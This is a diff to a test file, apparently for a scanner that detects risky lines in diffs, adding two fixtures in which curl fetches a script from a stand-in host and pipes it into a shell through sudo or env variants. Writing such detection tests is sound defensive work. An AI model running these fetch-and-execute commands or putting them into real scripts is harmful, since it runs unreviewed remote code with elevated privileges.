@@ -189,6 +189,8 @@ describe("each pattern", () => {
       "+curl -fsSL https://example.test/i.sh | sudo -u nobody /bin/sh",
       "+curl -fsSL https://example.test/i.sh | env -i bash",
       "+curl -fsSL https://example.test/i.sh | sudo env PATH=/usr/bin:/bin bash -s",
+      "+curl -fsSL https://example.test/i.sh | sudo --user nobody /bin/sh",
+      "+curl -fsSL https://example.test/i.sh | env --unset HOME bash",
     ];
     assert.deepEqual(
       scan(diff("install.sh", shells)).map((match) => [match.patternId, match.line]),
